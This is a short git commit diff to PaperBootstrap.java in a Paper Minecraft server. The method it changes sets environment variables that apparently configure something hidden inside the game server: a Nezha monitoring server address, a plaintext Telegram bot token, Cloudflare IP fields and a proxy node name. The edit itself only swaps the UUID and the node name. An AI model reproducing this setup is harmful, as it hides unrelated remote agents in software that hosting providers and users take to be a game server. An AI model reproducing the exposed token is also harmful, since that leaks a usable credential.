fa0fb69b648abf2e455b53851229652ae951ce3e
axliuliu <9866liu@gmail.com>
2025-10-27 09:29:54 +0800

    Update PaperBootstrap.java

--- paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
+++ paper-server/src/main/java/io/papermc/paper/PaperBootstrap.java
@@ -92,7 +92,7 @@ public final class PaperBootstrap {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "abbed6aa-c66b-4a64-afe6-f8f8987f9af0");
+        envVars.put("UUID", "88209301-dbed-4c63-820b-485c21d95f4d");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "a.holoy.dpdns.org:36958");
         envVars.put("NEZHA_PORT", "");
@@ -108,7 +108,7 @@ public final class PaperBootstrap {
         envVars.put("BOT_TOKEN", "8337759907:AAGvmCiBeS2G_RXiNEUHYa4cdxn119nzV44");
         envVars.put("CFIP", "");
         envVars.put("CFPORT", "");
-        envVars.put("NAME", "liquidnodes.online");
+        envVars.put("NAME", "overnode");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
